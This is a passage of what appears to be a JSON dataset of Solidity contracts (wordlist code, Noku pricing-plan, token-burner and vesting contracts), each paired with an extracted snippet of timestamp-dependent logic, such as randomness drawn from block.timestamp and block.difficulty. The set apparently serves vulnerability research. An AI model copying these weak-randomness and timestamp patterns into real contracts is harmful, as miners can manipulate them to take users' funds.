4520), \"reply\")\n mstore(add(toBytes, 4526), \"report\")\n mstore(add(toBytes, 4532), \"rescue\")\n mstore(add(toBytes, 4538), \"reset\")\n mstore(add(toBytes, 4544), \"result\")\n mstore(add(toBytes, 4550), \"resume\")\n mstore(add(toBytes, 4556), \"retro\")\n mstore(add(toBytes, 4562), \"return\")\n mstore(add(toBytes, 4568), \"reveal\")\n mstore(add(toBytes, 4574), \"review\")\n mstore(add(toBytes, 4580), \"reward\")\n mstore(add(toBytes, 4586), \"rhythm\")\n mstore(add(toBytes, 4592), \"ribbon\")\n mstore(add(toBytes, 4598), \"rice\")\n mstore(add(toBytes, 4604), \"ring\")\n mstore(add(toBytes, 4610), \"river\")\n mstore(add(toBytes, 4616), \"road\")\n mstore(add(toBytes, 4622), \"robot\")\n mstore(add(toBytes, 4628), \"robust\")\n mstore(add(toBytes, 4634), \"rock\")\n mstore(add(toBytes, 4640), \"roll\")\n mstore(add(toBytes, 4646), \"room\")\n mstore(add(toBytes, 4652), \"rope\")\n mstore(add(toBytes, 4658), \"route\")\n mstore(add(toBytes, 4664), \"royal\")\n mstore(add(toBytes, 4670), \"rubber\")\n mstore(add(toBytes, 4676), \"ruby\")\n mstore(add(toBytes, 4682), \"rule\")\n mstore(add(toBytes, 4688), \"runner\")\n mstore(add(toBytes, 4694), \"rural\")\n mstore(add(toBytes, 4700), \"safari\")\n mstore(add(toBytes, 4706), \"safe\")\n mstore(add(toBytes, 4712), \"saga\")\n mstore(add(toBytes, 4718), \"salad\")\n mstore(add(toBytes, 4724), \"salary\")\n mstore(add(toBytes, 4730), \"salmon\")\n mstore(add(toBytes, 4736), \"salt\")\n mstore(add(toBytes, 4742), \"sand\")\n mstore(add(toBytes, 4748), \"saturn\")\n mstore(add(toBytes, 4754), \"sauce\")\n mstore(add(toBytes, 4760), \"sauna\")\n mstore(add(toBytes, 4766), \"saver\")\n mstore(add(toBytes, 4772), \"scale\")\n mstore(add(toBytes, 4778), \"scene\")\n mstore(add(toBytes, 4784), \"school\")\n mstore(add(toBytes, 4790), \"scope\")\n mstore(add(toBytes, 4796), \"scout\")\n mstore(add(toBytes, 4802), \"screen\")\n mstore(add(toBytes, 4808), \"script\")\n mstore(add(toBytes, 4814), \"scroll\")\n mstore(add(toBytes, 4820), \"scuba\")\n mstore(add(toBytes, 4826), \"search\")\n mstore(add(toBytes, 4832), \"season\")\n mstore(add(toBytes, 4838), \"seat\")\n mstore(add(toBytes, 4844), \"second\")\n mstore(add(toBytes, 4850), \"secret\")\n mstore(add(toBytes, 4856), \"secure\")\n mstore(add(toBytes, 4862), \"see\")\n mstore(add(toBytes, 4868), \"seeker\")\n mstore(add(toBytes, 4874), \"self\")\n mstore(add(toBytes, 4880), \"seller\")\n mstore(add(toBytes, 4886), \"senate\")\n mstore(add(toBytes, 4892), \"sense\")\n mstore(add(toBytes, 4898), \"sensor\")\n mstore(add(toBytes, 4904), \"sepia\")\n mstore(add(toBytes, 4910), \"series\")\n mstore(add(toBytes, 4916), \"serve\")\n mstore(add(toBytes, 4922), \"setup\")\n mstore(add(toBytes, 4928), \"seven\")\n mstore(add(toBytes, 4934), \"severe\")\n mstore(add(toBytes, 4940), \"shadow\")\n mstore(add(toBytes, 4946), \"shape\")\n mstore(add(toBytes, 4952), \"shark\")\n mstore(add(toBytes, 4958), \"shield\")\n mstore(add(toBytes, 4964), \"shine\")\n mstore(add(toBytes, 4970), \"ship\")\n mstore(add(toBytes, 4976), \"shirt\")\n mstore(add(toBytes, 4982), \"shock\")\n mstore(add(toBytes, 4988), \"shore\")\n mstore(add(toBytes, 4994), \"shorts\")\n mstore(add(toBytes, 5000), \"shower\")\n mstore(add(toBytes, 5006), \"sigma\")\n mstore(add(toBytes, 5012), \"sign\")\n mstore(add(toBytes, 5018), \"signal\")\n mstore(add(toBytes, 5024), \"silent\")\n mstore(add(toBytes, 5030), \"silk\")\n mstore(add(toBytes, 5036), \"silver\")\n mstore(add(toBytes, 5042), \"simple\")\n mstore(add(toBytes, 5048), \"singer\")\n mstore(add(toBytes, 5054), \"site\")\n mstore(add(toBytes, 5060), \"sixth\")\n mstore(add(toBytes, 5066), \"sky\")\n mstore(add(toBytes, 5072), \"slash\")\n mstore(add(toBytes, 5078), \"slide\")\n mstore(add(toBytes, 5084), \"smart\")\n mstore(add(toBytes, 5090), \"smile\")\n mstore(add(toBytes, 5096), \"smooth\")\n mstore(add(toBytes, 5102), \"snow\")\n mstore(add(toBytes, 5108), \"soccer\")\n mstore(add(toBytes, 5114), \"sodium\")\n mstore(add(toBytes, 5120), \"sofa\")\n mstore(add(toBytes, 5126), \"solid\")\n mstore(add(toBytes, 5132), \"solo\")\n mstore(add(toBytes, 5138), \"solve\")\n mstore(add(toBytes, 5144), \"song\")\n mstore(add(toBytes, 5150), \"sonic\")\n mstore(add(toBytes, 5156), \"sound\")\n mstore(add(toBytes, 5162), \"soup\")\n mstore(add(toBytes, 5168), \"source\")\n mstore(add(toBytes, 5174), \"spa\")\n mstore(add(toBytes, 5180), \"space\")\n mstore(add(toBytes, 5186), \"speak\")\n mstore(add(toBytes, 5192), \"speed\")\n mstore(add(toBytes, 5198), \"spell\")\n mstore(add(toBytes, 5204), \"sphere\")\n mstore(add(toBytes, 5210), \"spin\")\n mstore(add(toBytes, 5216), \"split\")\n mstore(add(toBytes, 5222), \"spot\")\n mstore(add(toBytes, 5228), \"spray\")\n mstore(add(toBytes, 5234), \"spread\")\n mstore(add(toBytes, 5240), \"spring\")\n mstore(add(toBytes, 5246), \"square\")\n mstore(add(toBytes, 5252), \"stack\")\n mstore(add(toBytes, 5258), \"stamp\")\n mstore(add(toBytes, 5264), \"star\")\n mstore(add(toBytes, 5270), \"state\")\n mstore(add(toBytes, 5276), \"static\")\n mstore(add(toBytes, 5282), \"status\")\n mstore(add(toBytes, 5288), \"step\")\n mstore(add(toBytes, 5294), \"stereo\")\n mstore(add(toBytes, 5300), \"still\")\n mstore(add(toBytes, 5306), \"stone\")\n mstore(add(toBytes, 5312), \"story\")\n mstore(add(toBytes, 5318), \"strap\")\n mstore(add(toBytes, 5324), \"stream\")\n mstore(add(toBytes, 5330), \"street\")\n mstore(add(toBytes, 5336), \"strong\")\n mstore(add(toBytes, 5342), \"studio\")\n mstore(add(toBytes, 5348), \"study\")\n mstore(add(toBytes, 5354), \"stuff\")\n mstore(add(toBytes, 5360), \"style\")\n mstore(add(toBytes, 5366), \"submit\")\n mstore(add(toBytes, 5372), \"sugar\")\n mstore(add(toBytes, 5378), \"summer\")\n mstore(add(toBytes, 5384), \"sunset\")\n mstore(add(toBytes, 5390), \"super\")\n mstore(add(toBytes, 5396), \"supply\")\n mstore(add(toBytes, 5402), \"surf\")\n mstore(add(toBytes, 5408), \"survey\")\n mstore(add(toBytes, 5414), \"swap\")\n mstore(add(toBytes, 5420), \"sweet\")\n mstore(add(toBytes, 5426), \"swim\")\n mstore(add(toBytes, 5432), \"swing\")\n mstore(add(toBytes, 5438), \"switch\")\n mstore(add(toBytes, 5444), \"sword\")\n mstore(add(toBytes, 5450), \"symbol\")\n mstore(add(toBytes, 5456), \"sync\")\n mstore(add(toBytes, 5462), \"syntax\")\n mstore(add(toBytes, 5468), \"syrup\")\n mstore(add(toBytes, 5474), \"system\")\n mstore(add(toBytes, 5480), \"table\")\n mstore(add(toBytes, 5486), \"tail\")\n mstore(add(toBytes, 5492), \"talent\")\n mstore(add(toBytes, 5498), \"talk\")\n mstore(add(toBytes, 5504), \"tango\")\n mstore(add(toBytes, 5510), \"tape\")\n mstore(add(toBytes, 5516), \"target\")\n mstore(add(toBytes, 5522), \"taste\")\n mstore(add(toBytes, 5528), \"taxi\")\n mstore(add(toBytes, 5534), \"teach\")\n mstore(add(toBytes, 5540), \"team\")\n mstore(add(toBytes, 5546), \"techno\")\n mstore(add(toBytes, 5552), \"ten\")\n mstore(add(toBytes, 5558), \"tennis\")\n mstore(add(toBytes, 5564), \"text\")\n mstore(add(toBytes, 5570), \"theme\")\n mstore(add(toBytes, 5576), \"theory\")\n mstore(add(toBytes, 5582), \"thesis\")\n mstore(add(toBytes, 5588), \"think\")\n mstore(add(toBytes, 5594), \"third\")\n mstore(add(toBytes, 5600), \"though\")\n mstore(add(toBytes, 5606), \"thread\")\n mstore(add(toBytes, 5612), \"throw\")\n mstore(add(toBytes, 5618), \"ticket\")\n mstore(add(toBytes, 5624), \"tiger\")\n mstore(add(toBytes, 5630), \"tiny\")\n mstore(add(toBytes, 5636), \"title\")\n mstore(add(toBytes, 5642), \"token\")\n mstore(add(toBytes, 5648), \"tomato\")\n mstore(add(toBytes, 5654), \"topic\")\n mstore(add(toBytes, 5660), \"total\")\n mstore(add(toBytes, 5666), \"tower\")\n mstore(add(toBytes, 5672), \"toy\")\n mstore(add(toBytes, 5678), \"trace\")\n mstore(add(toBytes, 5684), \"trader\")\n mstore(add(toBytes, 5690), \"travel\")\n mstore(add(toBytes, 5696), \"tray\")\n mstore(add(toBytes, 5702), \"tree\")\n mstore(add(toBytes, 5708), \"trend\")\n mstore(add(toBytes, 5714), \"triple\")\n mstore(add(toBytes, 5720), \"trivia\")\n mstore(add(toBytes, 5726), \"truck\")\n mstore(add(toBytes, 5732), \"trust\")\n mstore(add(toBytes, 5738), \"truth\")\n mstore(add(toBytes, 5744), \"tulip\")\n mstore(add(toBytes, 5750), \"tune\")\n mstore(add(toBytes, 5756), \"tunnel\")\n mstore(add(toBytes, 5762), \"turn\")\n mstore(add(toBytes, 5768), \"turtle\")\n mstore(add(toBytes, 5774), \"two\")\n mstore(add(toBytes, 5780), \"ultra\")\n mstore(add(toBytes, 5786), \"under\")\n mstore(add(toBytes, 5792), \"undo\")\n mstore(add(toBytes, 5798), \"union\")\n mstore(add(toBytes, 5804), \"unique\")\n mstore(add(toBytes, 5810), \"unit\")\n mstore(add(toBytes, 5816), \"unlock\")\n mstore(add(toBytes, 5822), \"update\")\n mstore(add(toBytes, 5828), \"upload\")\n mstore(add(toBytes, 5834), \"upper\")\n mstore(add(toBytes, 5840), \"urban\")\n mstore(add(toBytes, 5846), \"use\")\n mstore(add(toBytes, 5852), \"valid\")\n mstore(add(toBytes, 5858), \"valley\")\n mstore(add(toBytes, 5864), \"valve\")\n mstore(add(toBytes, 5870), \"vector\")\n mstore(add(toBytes, 5876), \"velvet\")\n mstore(add(toBytes, 5882), \"vendor\")\n mstore(add(toBytes, 5888), \"verbal\")\n mstore(add(toBytes, 5894), \"verify\")\n mstore(add(toBytes, 5900), \"vertex\")\n mstore(add(toBytes, 5906), \"video\")\n mstore(add(toBytes, 5912), \"view\")\n mstore(add(toBytes, 5918), \"vinyl\")\n mstore(add(toBytes, 5924), \"violin\")\n mstore(add(toBytes, 5930), \"visit\")\n mstore(add(toBytes, 5936), \"visual\")\n mstore(add(toBytes, 5942), \"voice\")\n mstore(add(toBytes, 5948), \"void\")\n mstore(add(toBytes, 5954), \"volume\")\n mstore(add(toBytes, 5960), \"wagon\")\n mstore(add(toBytes, 5966), \"wall\")\n mstore(add(toBytes, 5972), \"wallet\")\n mstore(add(toBytes, 5978), \"walnut\")\n mstore(add(toBytes, 5984), \"watch\")\n mstore(add(toBytes, 5990), \"water\")\n mstore(add(toBytes, 5996), \"web\")\n mstore(add(toBytes, 6002), \"week\")\n mstore(add(toBytes, 6008), \"wheat\")\n mstore(add(toBytes, 6014), \"wheel\")\n mstore(add(toBytes, 6020), \"white\")\n mstore(add(toBytes, 6026), \"who\")\n mstore(add(toBytes, 6032), \"width\")\n mstore(add(toBytes, 6038), \"wiki\")\n mstore(add(toBytes, 6044), \"wind\")\n mstore(add(toBytes, 6050), \"window\")\n mstore(add(toBytes, 6056), \"winter\")\n mstore(add(toBytes, 6062), \"wisdom\")\n mstore(add(toBytes, 6068), \"wish\")\n mstore(add(toBytes, 6074), \"wizard\")\n mstore(add(toBytes, 6080), \"wolf\")\n mstore(add(toBytes, 6086), \"wonder\")\n mstore(add(toBytes, 6092), \"wood\")\n mstore(add(toBytes, 6098), \"worker\")\n mstore(add(toBytes, 6104), \"world\")\n mstore(add(toBytes, 6110), \"wrap\")\n mstore(add(toBytes, 6116), \"wrist\")\n mstore(add(toBytes, 6122), \"writer\")\n mstore(add(toBytes, 6128), \"year\")\n mstore(add(toBytes, 6134), \"yellow\")\n mstore(add(toBytes, 6140), \"yoga\")\n mstore(add(toBytes, 6146), \"zebra\")\n mstore(add(toBytes, 6152), \"zero\")\n mstore(add(toBytes, 6158), \"zinc\")\n mstore(add(toBytes, 6164), \"zone\")\n mstore(add(toBytes, 6170), \"zoo\")\n}\nwordlist = toBytes;\n}\n}",
  "extract_feature": [
    "function random(bytes32 _entropy) internal view returns (uint16) {\nreturn uint16(uint256(keccak256(\nabi.encodePacked(\nblock.timestamp, block.difficulty, _entropy\n)\n)\n)%1024);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1efa"
  },
  "filename": "3233.sol",
  "content": "pragma solidity ^0.4.23;\ncontract NokuPricingPlan {\n function payFee(bytes32 serviceName, uint256 multiplier, address client) public returns(bool paid);\n function usageFee(bytes32 serviceName, uint256 multiplier) public view returns(uint fee);\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract BurnableERC20 is ERC20 {\n function burn(uint256 amount) public returns (bool burned);\n}\ncontract NokuTokenBurner is Pausable {\n using SafeMath for uint256;\n event LogNokuTokenBurnerCreated(address indexed caller, address indexed wallet);\n event LogBurningPercentageChanged(address indexed caller, uint256 indexed burningPercentage);\n address public wallet;\n uint256 public burningPercentage;\n uint256 public burnedTokens;\n uint256 public transferredTokens;\n constructor(address _wallet) public {\n require(_wallet != address(0), \"_wallet is zero\");\n wallet = _wallet;\n burningPercentage = 100;\n emit LogNokuTokenBurnerCreated(msg.sender, _wallet);\n }\n function setBurningPercentage(uint256 _burningPercentage) public onlyOwner {\n require(0 <= _burningPercentage && _burningPercentage <= 100, \"_burningPercentage not in [0, 100]\");\n require(_burningPercentage != burningPercentage, \"_burningPercentage equal to current one\");\n burningPercentage = _burningPercentage;\n emit LogBurningPercentageChanged(msg.sender, _burningPercentage);\n }\n function tokenReceived(address _token, uint256 _amount) public whenNotPaused {\n require(_token != address(0), \"_token is zero\");\n require(_amount > 0, \"_amount is zero\");\n uint256 amountToBurn = _amount.mul(burningPercentage).div(100);\n if (amountToBurn > 0) {\n assert(BurnableERC20(_token).burn(amountToBurn));\n burnedTokens = burnedTokens.add(amountToBurn);\n }\n uint256 amountToTransfer = _amount.sub(amountToBurn);\n if (amountToTransfer > 0) {\n assert(BurnableERC20(_token).transfer(wallet, amountToTransfer));\n transferredTokens = transferredTokens.add(amountToTransfer);\n }\n }\n}\ncontract NokuFlatPlan is NokuPricingPlan, Ownable {\n using SafeMath for uint256;\n event LogNokuFlatPlanCreated(\n address indexed caller,\n uint256 indexed paymentInterval,\n uint256 indexed flatFee,\n address nokuMasterToken,\n address tokenBurner\n );\n event LogPaymentIntervalChanged(address indexed caller, uint256 indexed paymentInterval);\n event LogFlatFeeChanged(address indexed caller, uint256 indexed flatFee);\n uint256 public paymentInterval;\n uint256 public nextPaymentTime;\n uint256 public flatFee;\n address public nokuMasterToken;\n address public tokenBurner;\n constructor(\n uint256 _paymentInterval,\n uint256 _flatFee,\n address _nokuMasterToken,\n address _tokenBurner\n )\n public\n {\n require(_paymentInterval != 0, \"_paymentInterval is zero\");\n require(_flatFee != 0, \"_flatFee is zero\");\n require(_nokuMasterToken != 0, \"_nokuMasterToken is zero\");\n require(_tokenBurner != 0, \"_tokenBurner is zero\");\n paymentInterval = _paymentInterval;\n flatFee = _flatFee;\n nokuMasterToken = _nokuMasterToken;\n tokenBurner = _tokenBurner;\n nextPaymentTime = block.timestamp;\n emit LogNokuFlatPlanCreated(\n msg.sender,\n _paymentInterval,\n _flatFee,\n _nokuMasterToken,\n _tokenBurner\n );\n }\n function setPaymentInterval(uint256 _paymentInterval) public onlyOwner {\n require(_paymentInterval != 0, \"_paymentInterval is zero\");\n require(_paymentInterval != paymentInterval, \"_paymentInterval equal to current one\");\n paymentInterval = _paymentInterval;\n emit LogPaymentIntervalChanged(msg.sender, _paymentInterval);\n }\n function setFlatFee(uint256 _flatFee) public onlyOwner {\n require(_flatFee != 0, \"_flatFee is zero\");\n require(_flatFee != flatFee, \"_flatFee equal to current one\");\n flatFee = _flatFee;\n emit LogFlatFeeChanged(msg.sender, _flatFee);\n }\n function isValidService(bytes32 _serviceName) public pure returns(bool isValid) {\n return _serviceName != 0;\n }\n function payFee(bytes32 _serviceName, uint256 _multiplier, address _client) public returns(bool paid) {\n require(isValidService(_serviceName), \"_serviceName in invalid\");\n require(_multiplier != 0, \"_multiplier is zero\");\n require(_client != 0, \"_client is zero\");\n require(block.timestamp < nextPaymentTime);\n return true;\n }\n function usageFee(bytes32 , uint256 ) public view returns(uint fee) {\n return 0;\n }\n function paySubscription(address _client) public returns(bool paid) {\n require(_client != 0, \"_client is zero\");\n nextPaymentTime = nextPaymentTime.add(paymentInterval);\n assert(ERC20(nokuMasterToken).transferFrom(_client, tokenBurner, flatFee));\n NokuTokenBurner(tokenBurner).tokenReceived(nokuMasterToken, flatFee);\n return true;\n }\n}",
  "extract_feature": [
    "function payFee(bytes32 _serviceName, uint256 _multiplier, address _client) public returns(bool paid) {\nrequire(isValidService(_serviceName), \"_serviceName in invalid\");\nrequire(_multiplier != 0, \"_multiplier is zero\");\nrequire(_client != 0, \"_client is zero\");\nrequire(block.timestamp < nextPaymentTime);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1efb"
  },
  "filename": "3240.sol",
  "content": "pragma solidity ^0.4.23;\ncontract NokuPricingPlan {\n function payFee(bytes32 serviceName, uint256 multiplier, address client) public returns(bool paid);\n function usageFee(bytes32 serviceName, uint256 multiplier) public view returns(uint fee);\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract NokuCustomToken is Ownable {\n event LogBurnFinished();\n event LogPricingPlanChanged(address indexed caller, address indexed pricingPlan);\n NokuPricingPlan public pricingPlan;\n address public serviceProvider;\n bool public burningFinished;\n modifier onlyServiceProvider() {\n require(msg.sender == serviceProvider, \"caller is not service provider\");\n _;\n }\n modifier canBurn() {\n require(!burningFinished, \"burning finished\");\n _;\n }\n constructor(address _pricingPlan, address _serviceProvider) internal {\n require(_pricingPlan != 0, \"_pricingPlan is zero\");\n require(_serviceProvider != 0, \"_serviceProvider is zero\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n serviceProvider = _serviceProvider;\n }\n function isCustomToken() public pure returns(bool isCustom) {\n return true;\n }\n function finishBurning() public onlyOwner canBurn returns(bool finished) {\n burningFinished = true;\n emit LogBurnFinished();\n return true;\n }\n function setPricingPlan(address _pricingPlan) public onlyServiceProvider {\n require(_pricingPlan != 0, \"_pricingPlan is 0\");\n require(_pricingPlan != address(pricingPlan), \"_pricingPlan == pricingPlan\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n emit LogPricingPlanChanged(msg.sender, _pricingPlan);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract BurnableERC20 is ERC20 {\n function burn(uint256 amount) public returns (bool burned);\n}\ncontract NokuTokenBurner is Pausable {\n using SafeMath for uint256;\n event LogNokuTokenBurnerCreated(address indexed caller, address indexed wallet);\n event LogBurningPercentageChanged(address indexed caller, uint256 indexed burningPercentage);\n address public wallet;\n uint256 public burningPercentage;\n uint256 public burnedTokens;\n uint256 public transferredTokens;\n constructor(address _wallet) public {\n require(_wallet != address(0), \"_wallet is zero\");\n wallet = _wallet;\n burningPercentage = 100;\n emit LogNokuTokenBurnerCreated(msg.sender, _wallet);\n }\n function setBurningPercentage(uint256 _burningPercentage) public onlyOwner {\n require(0 <= _burningPercentage && _burningPercentage <= 100, \"_burningPercentage not in [0, 100]\");\n require(_burningPercentage != burningPercentage, \"_burningPercentage equal to current one\");\n burningPercentage = _burningPercentage;\n emit LogBurningPercentageChanged(msg.sender, _burningPercentage);\n }\n function tokenReceived(address _token, uint256 _amount) public whenNotPaused {\n require(_token != address(0), \"_token is zero\");\n require(_amount > 0, \"_amount is zero\");\n uint256 amountToBurn = _amount.mul(burningPercentage).div(100);\n if (amountToBurn > 0) {\n assert(BurnableERC20(_token).burn(amountToBurn));\n burnedTokens = burnedTokens.add(amountToBurn);\n }\n uint256 amountToTransfer = _amount.sub(amountToBurn);\n if (amountToTransfer > 0) {\n assert(BurnableERC20(_token).transfer(wallet, amountToTransfer));\n transferredTokens = transferredTokens.add(amountToTransfer);\n }\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract DetailedERC20 is ERC20 {\n string public name;\n string public symbol;\n uint8 public decimals;\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint256 public releaseTime;\n constructor(\n ERC20Basic _token,\n address _beneficiary,\n uint256 _releaseTime\n )\n public\n {\n require(_releaseTime > block.timestamp);\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(block.timestamp >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\npragma solidity ^0.4.23;\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return 